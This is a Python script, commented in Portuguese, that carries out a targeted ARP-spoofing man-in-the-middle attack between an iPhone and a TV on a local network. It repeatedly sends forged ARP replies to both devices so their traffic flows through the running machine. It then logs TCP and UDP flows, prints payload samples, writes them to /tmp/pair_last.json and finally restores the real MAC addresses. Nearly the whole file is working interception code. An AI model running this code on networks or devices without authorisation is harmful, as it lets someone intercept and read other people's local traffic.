#!/usr/bin/env python3
"""Captura o tráfego entre o iPhone e a TV envenenando só esse par.

Nunca toca no gateway: a internet do iPhone continua indo direto pelo roteador.
No fim, devolve os MACs verdadeiros em rajada antes de sair.

uso: capture_pair.py <iface> <iphone_ip> <iphone_mac> <tv_ip> <tv_mac> <segundos>
"""
import socket
import struct
import sys
import time
import select
import json
import os

ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806
ETH_P_IP = 0x0800
ARP_REPLY = 2


def mac_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":"))


def build_arp(iface_mac, sender_ip, target_mac, target_ip, op=ARP_REPLY):
    eth = target_mac + iface_mac + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, op,
        iface_mac, socket.inet_aton(sender_ip),
        target_mac, socket.inet_aton(target_ip),
    )
    return eth + arp


def ip_to_str(raw):
    return socket.inet_ntoa(raw)


def main():
    if len(sys.argv) < 7:
        print(__doc__)
        return 2
    iface = sys.argv[1]
    phone_ip, phone_mac = sys.argv[2], mac_bytes(sys.argv[3])
    tv_ip, tv_mac = sys.argv[4], mac_bytes(sys.argv[5])
    seconds = int(sys.argv[6])

    with open(f"/sys/class/net/{iface}/address") as fh:
        my_mac = mac_bytes(fh.read().strip())

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((iface, 0))
    sock.setblocking(False)

    # veneno: para o iPhone, a TV está no meu MAC; para a TV, o iPhone está no meu MAC
    to_phone = build_arp(my_mac, tv_ip, phone_mac, phone_ip)
    to_tv = build_arp(my_mac, phone_ip, tv_mac, tv_ip)

    flows = {}
    payload_samples = {}
    started = time.time()
    last_poison = 0.0
    packets = 0

    print(f"envenenando {phone_ip} <-> {tv_ip} em {iface} por {seconds}s", flush=True)
    seen_keys = set()
    last_beat = time.time()
    while time.time() - started < seconds:
        now = time.time()
        if now - last_beat >= 30:
            print(f"[{int(now - started)}s] pacotes={packets} fluxos={len(flows)}", flush=True)
            last_beat = now
        if now - last_poison >= 1.0:
            try:
                sock.send(to_phone)
                sock.send(to_tv)
            except OSError as exc:
                print("falha ao enviar ARP:", exc, flush=True)
            last_poison = now

        ready, _, _ = select.select([sock], [], [], 0.2)
        if not ready:
            continue
        data = sock.recv(65535)
        if len(data) < 14:
            continue
        eth_type = struct.unpack("!H", data[12:14])[0]
        if eth_type != ETH_P_IP:
            continue
        ip = data[14:]
        if len(ip) < 20:
            continue
        ihl = (ip[0] & 0x0F) * 4
        proto = ip[9]
        src = ip_to_str(ip[12:16])
        dst = ip_to_str(ip[16:20])
        pair = (src, dst)
        if src not in (phone_ip, tv_ip) or dst not in (phone_ip, tv_ip):
            continue
        packets += 1

        if proto == 6 and len(ip) >= ihl + 20:
            tcp = ip[ihl:]
            sport, dport = struct.unpack("!HH", tcp[0:4])
            doff = (tcp[12] >> 4) * 4
            payload = tcp[doff:]
            key = f"tcp {src}:{sport} -> {dst}:{dport}"
            entry = flows.setdefault(key, {"pkts": 0, "bytes": 0})
            if key not in seen_keys:
                seen_keys.add(key)
                print(f"novo fluxo {key}", flush=True)
            entry["pkts"] += 1
            entry["bytes"] += len(payload)
            if payload and key not in payload_samples and len(payload) > 8:
                payload_samples[key] = bytes(payload[:400])
        elif proto == 17 and len(ip) >= ihl + 8:
            udp = ip[ihl:]
            sport, dport = struct.unpack("!HH", udp[0:4])
            payload = udp[8:]
            key = f"udp {src}:{sport} -> {dst}:{dport}"
            entry = flows.setdefault(key, {"pkts": 0, "bytes": 0})
            entry["pkts"] += 1
            entry["bytes"] += len(payload)
            if payload and key not in payload_samples:
                payload_samples[key] = bytes(payload[:200])

    # corretivo: devolve os MACs verdadeiros aos dois lados
    fix_phone = build_arp(tv_mac, tv_ip, phone_mac, phone_ip)
    fix_tv = build_arp(phone_mac, phone_ip, tv_mac, tv_ip)
    for _ in range(6):
        try:
            sock.send(fix_phone)
            sock.send(fix_tv)
        except OSError:
            pass
        time.sleep(0.25)
    sock.close()

    report = {"pacotes": packets, "fluxos": flows}
    print(json.dumps(report, indent=2, ensure_ascii=False), flush=True)
    print("\n--- amostras de payload ---", flush=True)
    for key, sample in payload_samples.items():
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in sample)
        print(f"{key}\n    {text[:300]}", flush=True)
    with open("/tmp/pair_last.json", "w") as fh:
        json.dump({"flows": flows,
                   "samples": {k: list(v) for k, v in payload_samples.items()}},
                  fh)
    return 0


if __name__ == "__main__":
    sys.exit(main())
